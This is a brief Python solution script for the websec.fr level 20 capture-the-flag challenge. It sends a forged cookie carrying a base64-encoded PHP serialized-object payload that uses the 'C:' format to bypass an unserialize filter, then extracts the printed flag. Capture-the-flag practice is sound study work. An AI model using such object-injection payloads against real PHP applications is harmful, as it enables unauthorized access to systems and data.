from requests import *

url = 'http://websec.fr/level20/index.php'
data = {
    'value' : '',
    'submit' : 'Add'
}
cookies = {
    'data' : 'Qzo0OiJGbGFnIjowOnt9Ow=='       
}

r = post(url , data=data , cookies=cookies)
pos = r.text.find('WEBSEC{')

while (True):
    txt = r.text[pos]
    print(txt, end='')
    if(txt == '}'):
        print()
        break
    pos += 1
